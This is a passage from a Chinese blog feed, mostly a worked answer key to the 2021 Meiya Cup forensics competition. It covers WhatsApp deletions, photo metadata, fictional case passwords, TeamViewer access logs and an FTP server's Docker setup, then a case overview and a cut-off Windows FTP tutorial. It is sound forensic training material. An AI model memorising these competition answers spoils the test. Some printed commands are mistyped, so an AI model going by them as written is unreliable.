08:58:29</p></blockquote><p>在连接详情里就可以找到,注意时区的换算</p><img src="/images/meiya-2021-01/image-20220808001157140.png" alt="image-20220808001157140" style="zoom:67%;" /><br><h2 id="34关于Alex使用IPhoneXR中的Whatsapp和工地主管的对话"><a href="#34关于Alex使用IPhoneXR中的Whatsapp和工地主管的对话" class="headerlink" title="34关于Alex使用IPhoneXR中的Whatsapp和工地主管的对话"></a>34关于Alex使用IPhoneXR中的Whatsapp和工地主管的对话</h2><blockquote><p>[多选题] 阿力士iPhone XR中在软件WhatsApp中工地主管与阿力士的对话中曾提到：[佢叫我俾钱喎，BTC係唔係呢个啊？]。在进行电子数据取证分析后，以下哪一个是有可能关于此对话的正确描述？ (2分)</p><p>A. 此对话被Kariser Lee删除</p><p>B. 此对话的附件为一张图片文件</p><p>C. 此对话被Alex Chan 删除</p><p>D. 此对话是引用Alex Chan 回复</p></blockquote><p>在IphoneXR中找到工地主管和alex的聊天,可以看见,Alex和主管聊天时使用的就是IphoneXR</p><p>下图中这句话「<strong>BTC係Bitcoin呀</strong>」是alex对题目中这句话的回复,但是在聊天记录时间线中看不到工地主管所说的「<strong>佢叫我俾钱喎，BTC係唔係呢个啊</strong>」这句话,说明这句话被删除了</p><img src="/images/meiya-2021-01/image-20220808001617181.png" alt="image-20220808001617181" style="zoom:67%;" /><p>聊天记录的最上边可以看到这两句被删除的消息,可以看到工地主管这句消息带有一张jpeg图片附件</p><img src="/images/meiya-2021-01/image-20220808002015375.png" alt="image-20220808002015375" style="zoom:67%;" /><p>这里可以看见此消息是被sender,也就是工地主管删除的</p><p><img src="/images/meiya-2021-01/image-20220808002115724.png" alt="image-20220808002115724"></p><p>在工地主管的Iphone中也可以对应上:</p><img src="/images/meiya-2021-01/image-20220808002207312.png" alt="image-20220808002207312" style="zoom:67%;" /><p>综上,AB是正确的</p><br><h2 id="35ALEX曾要求工地主管支付多少个BTC"><a href="#35ALEX曾要求工地主管支付多少个BTC" class="headerlink" title="35ALEX曾要求工地主管支付多少个BTC"></a>35ALEX曾要求工地主管支付多少个BTC</h2><blockquote><p>[填空题] 阿力士iPhone XR的WhatsApp对话中，阿力士曾要求工地主管支付多少个BTC? (请以阿拉伯数字回答) (1分)</p></blockquote><img src="/images/meiya-2021-01/image-20220808002319475.png" alt="image-20220808002319475" style="zoom:67%;" /><p>10个,这句消息是被ALEX删除的</p><br><h2 id="36AELX的IPhoneXR中关于两张看似相同的图片"><a href="#36AELX的IPhoneXR中关于两张看似相同的图片" class="headerlink" title="36AELX的IPhoneXR中关于两张看似相同的图片"></a>36AELX的IPhoneXR中关于两张看似相同的图片</h2><blockquote><p>[多选题] 阿力士iPhone XR中 “IMG_0056.HEIC”的图像与”5005.JPG”(MD5: 96c48152249536d14eaa80086c92fcb9)” 看似为同一张相片，在电子数据取证分析下，以下哪样描述是正确? (2分)</p><p>A. 储存在不同的.db 里</p><p><strong>B. 有不同哈希值</strong></p><p><strong>C. IMG_0056.HEIC 为原图, 5005.JPG(MD5: 96c48152249536d14eaa80086c92fcb9)为缩略图</strong></p><p>D. IMG_0056.HEIC 曾被开启过，所以在IOS系统中创建了缩略图5005.JPG(MD5: 96c48152249536d14eaa80086c92fcb9)</p></blockquote><p>根据格式和元数据是否完整来判断,IMG_0056.HELC显然是原图:</p><img src="/images/meiya-2021-01/image-20220808002600556.png" alt="image-20220808002600556" style="zoom: 50%;" /><p>而5005.JPG的exif被抹除了,并且分辨率较低,是缩略图</p><img src="/images/meiya-2021-01/image-20220808002707171.png" alt="image-20220808002707171" style="zoom:67%;" /><p>因此BC项肯定正确,A项肯定错误</p><p>D项无法确认是否开启过</p><br><h2 id="37ALEX的IPhoneXR中相片IMG-0056-HEIC能提供哪些信息"><a href="#37ALEX的IPhoneXR中相片IMG-0056-HEIC能提供哪些信息" class="headerlink" title="37ALEX的IPhoneXR中相片IMG_0056.HEIC能提供哪些信息"></a>37ALEX的IPhoneXR中相片IMG_0056.HEIC能提供哪些信息</h2><blockquote><p>[多选题] 阿力士iPhone XR中相片檔IMG_0056.HEIC提供了什么电子数据取证的信息? (3分)</p><p>A. 此相片是由隔空投送 (Airdrop)得来</p><p>B. 此相片由iPhone XR拍摄</p><p>C. 此相片的拍摄时间为2021-10-21 17:45:48(UTC+8)</p><p><strong>D. 此相片的拍摄时间为2021-09-08 17:35:00(UTC+8)</strong></p></blockquote><p>找到元文件,查看文件信息:</p><img src="/images/meiya-2021-01/image-20220808003058430.png" alt="image-20220808003058430" style="zoom:67%;" /><p>可以确定BC错误,D正确</p><p>因为是多选题,所以A项肯定也是正确的，可以尝试验证一下：</p><p>在数据库这里搜索「air」,找到了一个有关蓝牙配对的数据库记录</p><p><strong>可以看到和iphone12配对的记录</strong>,时间和那张照片在iPhoneXR上创建的时间比较接近,所以这张照片应该是通过airdrop传输的</p><img src="/images/meiya-2021-01/image-20220808003309472.png" alt="image-20220808003309472" style="zoom:67%;" /><br><h2 id="38ALEX电邮账户的密码"><a href="#38ALEX电邮账户的密码" class="headerlink" title="38ALEX电邮账户的密码"></a>38ALEX电邮账户的密码</h2><blockquote><p>[单选题] 阿力士iPhone XR中阿力士的电邮账户<a href="mailto:&#x41;&#108;&#x65;&#120;&#99;&#x31;&#x39;&#x38;&#x35;&#49;&#48;&#x31;&#54;&#x40;&#x67;&#109;&#97;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;">&#x41;&#108;&#x65;&#120;&#99;&#x31;&#x39;&#x38;&#x35;&#49;&#48;&#x31;&#54;&#x40;&#x67;&#109;&#97;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;</a>的密码有可能是什么? (1分)</p><p>A. Ac19851016</p><p>B. Alex1985!</p><p><strong>C. Aa475869!</strong></p><p>D. 以上皆非</p></blockquote><p>此题在设备存储的密码里根本找不到</p><img src="/images/meiya-2021-01/image-20220808003445983.png" alt="image-20220808003445983" style="zoom:67%;" /><p>不能太死板了,想想自己的密码会往哪里存</p><p>最后在备忘录里找到了:</p><img src="/images/meiya-2021-01/image-20220808003530862.png" alt="image-20220808003530862" style="zoom:67%;" /><br><h2 id="39ALEX的IPhoneXR曾连接的wifi-Alex-Home的密码"><a href="#39ALEX的IPhoneXR曾连接的wifi-Alex-Home的密码" class="headerlink" title="39ALEX的IPhoneXR曾连接的wifi:Alex Home的密码"></a>39ALEX的IPhoneXR曾连接的wifi:Alex Home的密码</h2><p>这个在密码中能够找到:</p><img src="/images/meiya-2021-01/image-20220808003834112.png" alt="image-20220808003834112" style="zoom:67%;" /><h2 id="40ALEX的IPhoneXR最后经iCloud备份的时间"><a href="#40ALEX的IPhoneXR最后经iCloud备份的时间" class="headerlink" title="40ALEX的IPhoneXR最后经iCloud备份的时间"></a>40ALEX的IPhoneXR最后经iCloud备份的时间</h2><blockquote><p>[单选题] 阿力士iPhone XR经iCloud备份的最后时间是什么?(UTC+8)? (1分)</p><p><strong>A. 2021-10-21 17:51:38(UTC+8)</strong></p><p>B. 2021-10-21 18:02:13 + (UTC+8)</p><p>C. 2021-10-21 09:51:38(UTC+8)</p><p>D. 2021-10-21 10:02:13 + (UTC+8)</p></blockquote><p>在设备信息里就能找到:</p><img src="/images/meiya-2021-01/image-20220808004011342.png" alt="image-20220808004011342" style="zoom:67%;" /><h2 id="41ALEX的IPhoneXR的iBoot版本"><a href="#41ALEX的IPhoneXR的iBoot版本" class="headerlink" title="41ALEX的IPhoneXR的iBoot版本"></a>41ALEX的IPhoneXR的iBoot版本</h2><p>找到<code>PhoneInfo.xml</code>文件</p><img src="/images/meiya-2021-01/image-20220808004127122.png" alt="image-20220808004127122" style="zoom:67%;" /><img src="/images/meiya-2021-01/image-20220808004139560.png" alt="image-20220808004139560" style="zoom:67%;" /><h2 id="42Whatsapp群组「团购-新鲜猪肉牛肉-东涌群组-9-x2F-30」有哪些成员"><a href="#42Whatsapp群组「团购-新鲜猪肉牛肉-东涌群组-9-x2F-30」有哪些成员" class="headerlink" title="42Whatsapp群组「团购-新鲜猪肉牛肉-东涌群组-9&#x2F;30」有哪些成员"></a>42Whatsapp群组「团购-新鲜猪肉牛肉-东涌群组-9&#x2F;30」有哪些成员</h2><blockquote><p>[多选题] 阿力士iPhone XR中的WhatsApp群组『团购-新鲜猪肉牛肉-东涌群组-9&#x2F;30』有以下哪一个成员? (2分)</p><p><strong>A. <a href="mailto:&#x38;&#x35;&#x32;&#x36;&#48;&#x36;&#49;&#x37;&#51;&#51;&#x32;&#x40;&#115;&#x2e;&#x77;&#104;&#97;&#116;&#x73;&#x61;&#112;&#x70;&#46;&#x6e;&#x65;&#116;">&#x38;&#x35;&#x32;&#x36;&#48;&#x36;&#49;&#x37;&#51;&#51;&#x32;&#x40;&#115;&#x2e;&#x77;&#104;&#97;&#116;&#x73;&#x61;&#112;&#x70;&#46;&#x6e;&#x65;&#116;</a></strong></p><p>B. <a href="mailto:&#56;&#53;&#50;&#x36;&#48;&#52;&#x35;&#50;&#x35;&#55;&#x39;&#x40;&#115;&#x2e;&#119;&#x68;&#x61;&#x74;&#115;&#x61;&#x70;&#112;&#46;&#110;&#x65;&#116;">&#56;&#53;&#50;&#x36;&#48;&#52;&#x35;&#50;&#x35;&#55;&#x39;&#x40;&#115;&#x2e;&#119;&#x68;&#x61;&#x74;&#115;&#x61;&#x70;&#112;&#46;&#110;&#x65;&#116;</a></p><p>C. <a href="mailto:&#x38;&#53;&#50;&#x34;&#56;&#55;&#57;&#x31;&#53;&#54;&#53;&#x40;&#115;&#x2e;&#x77;&#x68;&#97;&#x74;&#x73;&#97;&#112;&#112;&#x2e;&#110;&#101;&#116;">&#x38;&#53;&#50;&#x34;&#56;&#55;&#57;&#x31;&#53;&#54;&#53;&#x40;&#115;&#x2e;&#x77;&#x68;&#97;&#x74;&#x73;&#97;&#112;&#112;&#x2e;&#110;&#101;&#116;</a></p><p><strong>D. <a href="mailto:85264630956@s.whatsapp.net">85264630956@s.whatsapp.net</a></strong></p></blockquote><img src="/images/meiya-2021-01/image-20220808004316710.png" alt="image-20220808004316710" style="zoom:67%;" /><br><hr><br><h1 id="PART4ALEX的Windows"><a href="#PART4ALEX的Windows" class="headerlink" title="PART4ALEX的Windows"></a>PART4ALEX的Windows</h1><p>尝试使用火眼仿真可以直接看到开机密码</p><img src="/images/meiya-2021-01/image-20220808004443235.png" alt="image-20220808004443235" style="zoom:67%;" /><h2 id="43ALEX在hongkongcard-com-论坛的密码"><a href="#43ALEX在hongkongcard-com-论坛的密码" class="headerlink" title="43ALEX在hongkongcard.com 论坛的密码"></a>43ALEX在hongkongcard.com 论坛的密码</h2><img src="/images/meiya-2021-01/image-20220808004523282.png" alt="image-20220808004523282" style="zoom:67%;" /><p>(这人好像全都在用这一个密码)</p><br><h2 id="44ALEX的计算机显示其曾用什么方法进入受害者计算机"><a href="#44ALEX的计算机显示其曾用什么方法进入受害者计算机" class="headerlink" title="44ALEX的计算机显示其曾用什么方法进入受害者计算机"></a>44ALEX的计算机显示其曾用什么方法进入受害者计算机</h2><blockquote><p>[单选题] 阿力士的计算机显示阿力士曾用什么方法进入受害者(主管)的计算机? (1分)</p><p><strong>A. 远程操控</strong></p><p>B. 特洛伊木马程序</p><p>C. 勒索软件</p><p>D. 恶意软件</p></blockquote><p>前面围绕Teamviewer做了那么多文章,肯定是A了</p><br><h2 id="45续上题，ALEX最后一次进入受害者计算机的时间"><a href="#45续上题，ALEX最后一次进入受害者计算机的时间" class="headerlink" title="45续上题，ALEX最后一次进入受害者计算机的时间"></a>45续上题，ALEX最后一次进入受害者计算机的时间</h2><blockquote><p>[单选题] 续上题，阿力士最后一次进入受害者(主管)计算机的时间是什么? (2分)</p><p>A. 于2021年10月18日 10时36分</p><p>B. 于2021年10月18日18时36分</p><p>C. 于2021年10月18日6时53分</p><p><strong>D. 于2021年10月18日18时42分</strong></p></blockquote><p>在连接记录里找到</p><img src="/images/meiya-2021-01/image-20220808004842960.png" alt="image-20220808004842960" style="zoom:67%;" /><br><h2 id="46ALEX的FTP主机地址"><a href="#46ALEX的FTP主机地址" class="headerlink" title="46ALEX的FTP主机地址"></a>46ALEX的FTP主机地址</h2><p>这题其实在<a href="#meiya_person_04">分析路由器记录时</a>就知道了为<code>218.255.242.114</code></p><p>在ALEX的电脑里找到的信息能够验证答案:</p><img src="/images/meiya-2021-01/image-20220808005242522.png" alt="image-20220808005242522" style="zoom:67%;" /><br><h2 id="47ALEX的计算机于2021年9月至2021年11月期间计算机被登录的次数"><a href="#47ALEX的计算机于2021年9月至2021年11月期间计算机被登录的次数" class="headerlink" title="47ALEX的计算机于2021年9月至2021年11月期间计算机被登录的次数"></a>47ALEX的计算机于2021年9月至2021年11月期间计算机被登录的次数</h2><img src="/images/meiya-2021-01/image-20220808005336162.png" alt="image-20220808005336162" style="zoom:67%;" /><br><h2 id="47ALEX计算机Microsoft-Office-2007的版本"><a href="#47ALEX计算机Microsoft-Office-2007的版本" class="headerlink" title="47ALEX计算机Microsoft Office 2007的版本"></a>47ALEX计算机Microsoft Office 2007的版本</h2><p>取证结果的软件信息中找到:</p><img src="/images/meiya-2021-01/image-20220808005514215.png" alt="image-20220808005514215" style="zoom:67%;" /><br><h2 id="48ALEX计算机中Basic-data-partition-EFI3-的Volume-ID"><a href="#48ALEX计算机中Basic-data-partition-EFI3-的Volume-ID" class="headerlink" title="48ALEX计算机中Basic data partition(EFI3)的Volume ID"></a>48ALEX计算机中Basic data partition(EFI3)的Volume ID</h2><p>查到两种方式,找到的答案不一样…</p><p>使用FTK Imager挂载磁盘并加载</p><p>在路径:<code>Basic data partition3/root/System Volume Information/SDP/OnlineMetadataCache/…</code>可以</p><img src="/images/meiya-2021-01/image-20220808005802002.png" alt="image-20220808005802002" style="zoom:67%;" /><p>或者直接使用DiskGenius加载后查看卷序列号:</p><img src="/images/meiya-2021-01/image-20220808005942473.png" alt="image-20220808005942473" style="zoom:67%;" /><br><h2 id="49ALEX计算机的Windows-product-ID"><a href="#49ALEX计算机的Windows-product-ID" class="headerlink" title="49ALEX计算机的Windows product ID"></a>49ALEX计算机的Windows product ID</h2><p>系统信息里找到：</p><img src="/images/meiya-2021-01/image-20220808010029230.png" alt="image-20220808010029230" style="zoom:67%;" /><br><h2 id="51ALEX计算机曾经下载一张猴子的图片，以下哪一项描述正确"><a href="#51ALEX计算机曾经下载一张猴子的图片，以下哪一项描述正确" class="headerlink" title="51ALEX计算机曾经下载一张猴子的图片，以下哪一项描述正确"></a>51ALEX计算机曾经下载一张猴子的图片，以下哪一项描述正确</h2><blockquote><p>[单选题] 阿力士计算机曾经下载一张猴子的图片，以下哪一项描述正确? (1分)</p><p><strong>A. 该图片是由 “<a href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgn6ABvcqTfFPjcIbjc9hdx1H4PtQsAuVyTQ&amp;usqp=CAU&quot;%E4%B8%8B%E8%BD%BD%E7%9A%84">https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgn6ABvcqTfFPjcIbjc9hdx1H4PtQsAuVyTQ&amp;usqp=CAU&quot;下载的</a></strong></p><p>B. 该图片经过加密</p><p>C. 该图片于2021-09-30 下载</p><p>D. 该图片是由GIF档转换成PNG檔</p></blockquote><p>在浏览器的下载记录中可以找到一张图片,它下载时就是<strong>PNG</strong>格式</p><img src="/images/meiya-2021-01/image-20220808010236660.png" alt="image-20220808010236660" style="zoom:67%;" /><p>找到文件存放路径,发现就是这张猴子的照片,那么上面那个URL说明A项正确</p><img src="/images/meiya-2021-01/image-20220808010310837.png" alt="image-20220808010310837" style="zoom:67%;" /><h2 id="52ALEX计算机安装的Microsoft-Office-2007-的密钥"><a href="#52ALEX计算机安装的Microsoft-Office-2007-的密钥" class="headerlink" title="52ALEX计算机安装的Microsoft Office 2007 的密钥"></a>52ALEX计算机安装的Microsoft Office 2007 的密钥</h2><p>这个文件就存放在桌面上,仿真起来的话一眼就能发现了</p><img src="/images/meiya-2021-01/image-20220808010438567.png" alt="image-20220808010438567" style="zoom:67%;" /><h1 id="PART5ALEX的FTP服务器"><a href="#PART5ALEX的FTP服务器" class="headerlink" title="PART5ALEX的FTP服务器"></a>PART5ALEX的FTP服务器</h1><p><span id="meiya_person_01">首先使用取证大师解析FTP服务器镜像</span></p><p>从取证结果里就能够发现两个BitLocker密钥文件,但对照了恢复密钥标记之后,发现并不是工地主管的电脑的(可能是另外两个员工的)</p><img src="/images/meiya-2021-01/image-20220808011043375.png" alt="image-20220808011043375" style="zoom:67%;" /><p>此外这里还能够找到一个mac电脑的恢复密钥,这种线索都需要先记录下来,后面题可能用得到</p><img src="/images/meiya-2021-01/image-20220808011110270.png" alt="image-20220808011110270" style="zoom:67%;" /><p>再实时搜索一下关键词<code>BitLocker</code>,终于找到了工地主管电脑的恢复密钥</p><img src="/images/meiya-2021-01/image-20220808011232206.png" alt="image-20220808011232206" style="zoom:67%;" /><br><h2 id="53阿力士FTP服务器使用命令行安装了什么程序"><a href="#53阿力士FTP服务器使用命令行安装了什么程序" class="headerlink" title="53阿力士FTP服务器使用命令行安装了什么程序"></a>53阿力士FTP服务器使用命令行安装了什么程序</h2><blockquote><p>[单选题] 阿力士FTP 服务器用户使用命令行安装了甚么程序? (1分)</p><p><strong>A. Docker</strong></p><p>B. Chrome</p><p>C. FileZilla</p><p>D. TeamViewer</p></blockquote><p>历史命令里可以找到:(而且一个Linux的服务器一般也不太可能按照BCD)</p><img src="/images/meiya-2021-01/image-20220808011328036.png" alt="image-20220808011328036" style="zoom:67%;" /><br><h2 id="54哪些档案于FTP服务器曾重复出现"><a href="#54哪些档案于FTP服务器曾重复出现" class="headerlink" title="54哪些档案于FTP服务器曾重复出现"></a>54哪些档案于FTP服务器曾重复出现</h2><blockquote><p>[多选题] 以下哪些档案于阿力士FTP 服务器曾重复出现? (3分)</p><p>A. Material1</p><p>B. Material2</p><p>C. Material3</p><p><strong>D. Staff1</strong></p><p><strong>E. Staff2</strong></p><p><strong>F. Staff3</strong></p></blockquote><p>从取证结果的BitLocker密钥那里跳转到源文件,可以看到一个名为<code> dangerous_project</code>的目录</p><p>里边的文件和工地主管那边解开磁盘后看到的有重合,<strong>那么这个目录应该就是alex窃取的文件目录</strong></p><p>从里边看见基本上是一些xlsx表格文件</p><img src="/images/meiya-2021-01/image-20220808011553998.png" alt="image-20220808011553998" style="zoom:67%;" /><p>直接去文件分类历找,发现Staff文件有重复</p><img src="/images/meiya-2021-01/image-20220808011630120.png" alt="image-20220808011630120" style="zoom:67%;" /><br><h2 id="55FTP服务器中哪个文件夹曾被变更访问权限"><a href="#55FTP服务器中哪个文件夹曾被变更访问权限" class="headerlink" title="55FTP服务器中哪个文件夹曾被变更访问权限"></a>55FTP服务器中哪个文件夹曾被变更访问权限</h2><p>直接历史命令中找<code>chmod</code>的变更权限命令:可以看到正是存放窃取文件的<code>dangerous_project</code>目录</p><img src="/images/meiya-2021-01/image-20220808011804971.png" alt="image-20220808011804971" style="zoom:67%;" /><br><h2 id="56FTP服务器建设后-有多少个用户被加入"><a href="#56FTP服务器建设后-有多少个用户被加入" class="headerlink" title="56FTP服务器建设后,有多少个用户被加入"></a>56FTP服务器建设后,有多少个用户被加入</h2><blockquote><p><strong>pure命令用于添加虚拟用户</strong></p></blockquote><img src="/images/meiya-2021-01/image-20220808011941415.png" alt="image-20220808011941415" style="zoom:67%;" /><p>只能找到添加了一个名为<code>wai</code>的用户</p><br><h2 id="57此FTP服务器以何种方式连接网络，且是何种网络状态"><a href="#57此FTP服务器以何种方式连接网络，且是何种网络状态" class="headerlink" title="57此FTP服务器以何种方式连接网络，且是何种网络状态"></a>57此FTP服务器以何种方式连接网络，且是何种网络状态</h2><blockquote><p>[单选题] 根据阿力士FTP服务器设定显示，此服务器是以_____方式连接网络，且是一个_______网络状态 (1分)</p><p>A. 无线 , 公开</p><p>B. 无线 , 私人</p><p><strong>C. 有线 , 公开</strong></p><p>D. 有线 , 私人</p></blockquote><img src="/images/meiya-2021-01/image-20220808012139017.png" alt="image-20220808012139017" style="zoom:67%;" /><p>上图中能看到网络接口名称,<strong>且这里看到的IP和之前在路由器日志那边看到的 <a href="#meiya_person_04">FTP服务器</a>IP一致</strong></p><p>说明FTP服务器是有线连接的,且使用的是公开的IP</p><p>(<strong>内外网IP一致,说明此服务器的网络接口直接连接到公网上. 如果是无线的一般还得有个内网IP才对</strong>)</p><br><h2 id="57FTP服务器设定的最多使用者数目"><a href="#57FTP服务器设定的最多使用者数目" class="headerlink" title="57FTP服务器设定的最多使用者数目"></a>57FTP服务器设定的最多使用者数目</h2><p>找到<code>pure-ftpd.conf</code>其中记录了配置信息:</p><img src="/images/meiya-2021-01/image-20220808012752007.png" alt="image-20220808012752007" style="zoom:67%;" /><br><h2 id="58此FTP服务器使用Docker安装了哪个FTP程序"><a href="#58此FTP服务器使用Docker安装了哪个FTP程序" class="headerlink" title="58此FTP服务器使用Docker安装了哪个FTP程序"></a>58此FTP服务器使用Docker安装了哪个FTP程序</h2><p>历史命令中可以找到<code>docker pull</code>命令(<strong>从仓库拉取镜像</strong>)</p><img src="/images/meiya-2021-01/image-20220808012949926.png" alt="image-20220808012949926" style="zoom:67%;" /><p>拉取的镜像名为<strong>stilliard&#x2F;pure-ftpd</strong></p><br><h2 id="60此FTP服务器曾使用何版本的Linux内核"><a href="#60此FTP服务器曾使用何版本的Linux内核" class="headerlink" title="60此FTP服务器曾使用何版本的Linux内核"></a>60此FTP服务器曾使用何版本的Linux内核</h2><blockquote><p>[多选题] 阿力士FTP 服务器曾使用过甚么版本的Linux内核? (2分)</p><p><strong>A. linux-headers-5.11.0-16</strong></p><p>B. linux-headers-5.11.0-17</p><p>C. linux-headers-5.11.0-36</p><p><strong>D. inux-headers-5.11.0-37</strong></p><p>E. linux-headers-5.11.0-40</p></blockquote><p>仿真后可以使用一下其中一个命令查看:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname  -r</span><br><span class="line">dpkg --get -selections | grep linux-image</span><br></pre></td></tr></table></figure><p>或者直接搜索关键词<code>linux-headers</code></p><img src="/images/meiya-2021-01/image-20220808013231058.png" alt="image-20220808013231058" style="zoom:67%;" /><br><h2 id="61此FTP的磁盘分区有哪种文件系统"><a href="#61此FTP的磁盘分区有哪种文件系统" class="headerlink" title="61此FTP的磁盘分区有哪种文件系统"></a>61此FTP的磁盘分区有哪种文件系统</h2><blockquote><p>[多选题] 阿力士FTP 服务器的磁盘分区，有以下哪一种文件系统? (2分)</p><p>A. FAT16</p><p><strong>B. FAT32</strong></p><p>C. ExFAT</p><p>D. HFS+</p><p><strong>E. Ext4</strong></p></blockquote><p>查看分区信息就可以</p><p><img src="/images/meiya-2021-01/image-20220808013410670.png" alt="image-20220808013410670"></p><p><img src="/images/meiya-2021-01/image-20220808013420529.png" alt="image-20220808013420529"></p><br><h2 id="62此FTP服务器用户使用何指令检查现存的docker容器"><a href="#62此FTP服务器用户使用何指令检查现存的docker容器" class="headerlink" title="62此FTP服务器用户使用何指令检查现存的docker容器"></a>62此FTP服务器用户使用何指令检查现存的docker容器</h2><p>常识题</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container ps-a # 查看所有容器</span><br></pre></td></tr></table></figure><p>历史命令中也可以找到</p><img src="/images/meiya-2021-01/image-20220808013538573.png" alt="image-20220808013538573" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
          <category> 比赛 </category>
          
          <category> 2021美亚杯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021美亚杯_整体案情</title>
      <link href="/post/dc3f0821.html"/>
      <url>/post/dc3f0821.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-资格赛"><a href="#1-资格赛" class="headerlink" title="1 资格赛"></a>1 资格赛</h1><blockquote><p>2021年10月某日早上，本市一个名为”大路建设”的高速公路工地主管发现办公室的计算机被加密并无法开启，其后收到了勒案通知。考虑到高速公路的基建安全，主管决定报警。警方调查人员到达现场取证，发现办公室内有三部个人计算机，通过一个老款路由器接入互联网。经调查相关电子证据后，譬方怀疑一位本地男子一阿力士与本案有关，并将他拘捕。现在你被委派处理这起案件，请由以下资料分析阿力士在本案中的违法犯罪行为，并还原事件经过。</p><p>材料:</p><ul><li>阿力士的背景资料</li><li>警方现场勘查调查报告</li><li>高速公路工地办公室路由器记录(<strong>log路由器日志文件</strong>)</li><li>工地主管办公室计算机的电子数据(<strong>计算机镜像文件</strong>)</li><li>工地主管移动电话的电子数据(<strong>IPhone6的ufdr备份文件</strong>)</li><li>阿力士计算机的电子数据(<strong>计算机镜像文件</strong>)</li><li>阿力士FTP服务器的电子数据(<strong>服务器镜像文件</strong>)</li><li>阿力士移动电话(1)的电子数据(<strong>IPhone12的ufdr备份文件</strong>)</li><li>阿力士移动电话(2)的电子数据(<strong>IPhoneXR的ufdr备份文件</strong>)</li></ul></blockquote><br><hr><br><h1 id="2-团体赛"><a href="#2-团体赛" class="headerlink" title="2 团体赛"></a>2 团体赛</h1><p>几天后，”大路建设”旗下有一家名为“元材原料”的材料供应子公司，该公司发现几名员工的个人财务资料在网上遭到公开发布。为了员工安全，主管决定报警求助。经警方调查发现黑客入侵的手法与“大路建设“的案件十分相似，因此引起调查人员怀<br>疑两起案件有所关联。<br>经调查后，警方拘捕了“常威”和“特普”两名本地男子，怀疑他们与本案有关。警方在搜查他们的住宅及公司后，扣押了数台数码设备，请分析以下电子数据并重建电子数据痕迹，以确认“常威”和”特普”在本案中是否有违法犯罪，并还原事件经过。</p><blockquote><p>与「大路建设」相关的材料:</p><ul><li><p>工地职员A办公室计算机的电子数据(<strong>计算机镜像文件</strong>)</p></li><li><p>工地职员B办公室计算机的电子数据(<strong>计算机镜像文件</strong>)</p></li></ul></blockquote><br><blockquote><p>与「元材原料」相关的材料:</p><ul><li>网页服务器的电子数据(<strong>服务器镜像文件</strong>)</li></ul></blockquote><br><blockquote><p>与「常威」相关的资料:</p><ul><li><p>常威的背景资料</p></li><li><p>常威手机的电子数据(<strong>安卓手机镜像</strong>)</p></li><li><p>常威USB设备的电子数据(<strong>USB镜像</strong>)</p></li><li><p>常威Windows计算机的电子数据(<strong>Windows计算机镜像文件</strong>)</p></li><li><p>常威矿机的电子数据(<strong>LINUX计算机镜像文件</strong>)</p></li><li><p>常威无人机的电子数据(<strong>和手机镜像类似</strong>)</p></li><li><p>常威无人机内存卡的电子数据</p></li><li><p>常威MAC计算机的电子数据(<strong>MAC计算机aff4格式镜像文件</strong>)</p></li><li><p>常威LINUX计算机的电子数据(<strong>LINUX计算机镜像文件</strong>)</p></li></ul></blockquote><br><blockquote><p>与「特普」相关的资料:</p><ul><li><p>特普的背景资料</p></li><li><p>特普手机的电子数据(<strong>安卓手机镜像</strong>)</p></li><li><p>特普Windows计算机的电子数据(<strong>Windows计算机镜像文件</strong>)</p></li><li><p>特普Windows计算机存储器提取的镜像文件(<strong>内存镜像</strong>)</p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
          <category> 比赛 </category>
          
          <category> 2021美亚杯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows和mac快捷互传文件</title>
      <link href="/post/7ead17b2.html"/>
      <url>/post/7ead17b2.html</url>
      
        <content type="html"><![CDATA[<p><strong>在windows和mac之间互相传文件一直都很蛋疼,网上大多数教程说的在windows上设置共享文件夹的方法时而好用时而不好用,而且速度感人😅,需要找一个更快捷的互传文件方法</strong></p><p>在windows10上搭建FTP服务器,然后mac直接通过FileZilla等FTP软件来上传和下载就好了(<strong>当然两者要在同一个局域网里</strong>)</p><h1 id="1安装IIS工具-启动FTP服务"><a href="#1安装IIS工具-启动FTP服务" class="headerlink" title="1安装IIS工具,启动FTP服务"></a>1安装IIS工具,启动FTP服务</h1><p><strong>控制面板-程序和功能-启动或关闭windows功能</strong></p><img src="/images/winftp/image-20220803173147596.png" alt="image-20220803173147596" style="zoom:67%;" /><p>把FTP下面的选项都点上:</p><img src="/images/winftp/image-20220803173214403.png" alt="image-20220803173214403" style="zoom:67%;" /><p>设置开机启动FTP服务:</p><p><code>win+r</code> 运行 <code>services.msc</code>:</p><img src="/images/winftp/image-20220803173258129.png" alt="image-20220803173258129" style="zoom:67%;" /><p>找到其中的FTP服务,修改启动类型为自动</p><img src="/images/winftp/image-20220803173306856.png" alt="image-20220803173306856" style="zoom:67%;" /><br><hr><br><h1 id="2创建一个用于FTP的用户账户"><a href="#2创建一个用于FTP的用户账户" class="headerlink" title="2创建一个用于FTP的用户账户"></a>2创建一个用于FTP的用户账户</h1><p>直接添加一个名为share的账户就好</p><img src="/images/winftp/image-20220803173503472.png" alt="image-20220803173503472" style="zoom: 67%;" /><br><hr><br><h1 id="3配置FTP服务器站点"><a href="#3配置FTP服务器站点" class="headerlink" title="3配置FTP服务器站点"></a>3配置FTP服务器站点</h1><p><strong>控制面板-管理工具-Internet Information Services (IIS)管理器</strong></p><p>右键添加FTP站点:</p><img src="/images/winftp/image-20220803173725345.png" alt="image-20220803173725345" style="zoom:67%;" /><p>这里添加一个用于传输文件的目录,用户连接FTP后就可以向这个位置上传,或从这个位置下载:</p><img src="/images/winftp/image-20220803173746835.png" alt="image-20220803173746835" style="zoom:67%;" /><p>下一步,配置本地(FTP服务器)的IP和端口(这里没有使用FTP的默认端口21):</p><img src="/images/winftp/image-20220803173834660.png" alt="image-20220803173834660" style="zoom:50%;" /><img src="/images/winftp/image-20220803173903922.png" alt="image-20220803173903922" 